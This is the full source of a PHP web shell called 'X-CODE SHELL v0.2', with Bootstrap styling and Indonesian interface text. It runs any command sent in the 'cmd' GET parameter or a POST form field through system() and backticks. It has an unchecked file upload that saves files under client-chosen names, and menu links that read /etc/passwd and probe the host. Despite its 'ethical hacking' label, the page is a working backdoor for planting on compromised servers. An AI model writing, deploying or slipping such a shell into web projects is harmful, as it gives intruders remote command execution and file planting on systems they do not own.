
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
  <meta name="generator" content="Jekyll v4.1.1">
  <title>X-CODE SHELL</title>

  <link rel="canonical" href="https://getbootstrap.com/docs/4.5/examples/cover/">

  <!-- Bootstrap core CSS -->
  <link href="https://getbootstrap.com/docs/4.5/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>


  <style>
    .bd-placeholder-img {
      font-size: 1.125rem;
      text-anchor: middle;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }

    @media (min-width: 768px) {
      .bd-placeholder-img-lg {
        font-size: 2.5rem;
      }
    }
  </style>
  <link href="https://getbootstrap.com/docs/4.5/examples/cover/cover.css" rel="stylesheet">
</head>
<body class="text-center">
<!--
    Shell Coded By : Kurniawandata
    Kontributor 1 : Lutfi Anam
    Kontributor 2 : Arikun1337

    Kurniawandata : https://github.com/kurniawandata
    Lutfi Anam : https://github.com/lutfianam
    Arikun1337 : https://github.com/imyhacker

-->
  <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
    <header class="masthead mb-auto">
      <div class="inner">
        <h3 class="masthead-brand">X-CODE SHELL</h3>
        <nav class="nav nav-masthead justify-content-center">
          <a class="nav-link" href="?">Home</a>
          <a class="nav-link" href="?shell">Shell</a>
          <a class="nav-link" href="?inject">Upload</a>

          <div class="nav-link dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown" style="text-decoration: none">CEK</a>
            <div class="dropdown-menu">
              <a href="?cmd=uname -a" class="dropdown-item">Kernel</a>
              <a href="?cmd=lsb_release -a" class="dropdown-item">Distro</a>
              <a href="?cmd=php -v" class="dropdown-item">Versi PHP</a>
              <a href="?cmd=lscpu" class="dropdown-item">CPU</a>
              <a href="?cmd=free" class="dropdown-item">RAM</a>
              <a href="?cmd=cat /etc/passwd" class="dropdown-item">USER</a>
            </div>
          </div>
        </nav>
      </div>
    </header>

    <main role="main" class="inner cover">
       <header>
    <h1 class="title">X-code PHP Shell v0.2</h1>
    <p>For Ethicial Hacking</p><br>
  </header>
      <?php
      if (empty($_REQUEST)) {
      echo '<br>';
      
    } ?>
    <?php

    if (!empty($_GET['cmd'])) { 
    ?>
  <div class="form-group">
      <pre>
    <textarea class="form-control" id="exampleFormControlTextarea1" rows="10">
<?= system($_GET['cmd']); ?>
    </textarea>
</pre>
  
</div>
  <?php

  } 

  if(isset($_GET['inject'])) { 
  if(isset($_POST['cekfile'])) {
  move_uploaded_file($_FILES["file"]["tmp_name"],"".$_FILES["file"]["name"]);
  echo '
<script type="text/javascript">
  Swal.fire({
  title: "Success !",
  text: "Success Upload",
  icon: "success",
  confirmButtonText: "Ok"
})

</script>
 <meta http-equiv="refresh" content="1;url=?inject" />
  ';

} else {
echo '
  <form enctype="multipart/form-data" action="" method="post">

<div class="row">
  <div class="col-md-9">
    <div class="custom-file mb-3">
    <input type="file" class="custom-file-input" id="validatedCustomFile" required>
    <label class="custom-file-label" for="validatedCustomFile">Choose file...</label>
  </div>
  </div>
  <div class="col-md-3">
    <input name="cekfile" type="submit" class="btn btn-outline-success btn-block" value="Upload">
  </div>
</div>
</form>


';
} 
} 

if(isset($_GET['shell'])) { 
if(isset($_POST['x'])) {
echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <br /><form action=""  method="POST">
  
  <div class="row">
    <div class="col-md-8 mt-3 form-group">

      <input type="text" class="form-control" name="x" value="ls -l">
    </div>
    <div class="col-md-4 mt-3 form-group">


      <input type="submit" class="btn btn-outline-secondary "  value="Execute">
    </div>
  </div>

</form>';
?>
<div class="form-group">
  <textarea class="form-control" rows="3" readonly><?= `{$_POST['x']};` ?> </textarea>
</div>
<? die(); ?>
<?php 
} else {
echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <br /><form action="" method="POST">

  <div class="row">
    <div class="col-md-8 mt-3 form-group">

      <input type="text" class="form-control" name="x" value="ls -l">
    </div>
    <div class="col-md-4 mt-3 form-group">


      <input type="submit" class="btn btn-outline-secondary btn-block" value="Execute">
    </div>
  </div>

</form>';
} 
}
?>
</main>

<footer class="mastfoot mt-auto">
  <div class="inner">
    <p>Shell By <a href="https://xcode.or.id"> Kurniawan X-code</a></p>
  </div>
</footer>
</div>


<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>


</body>
</html>

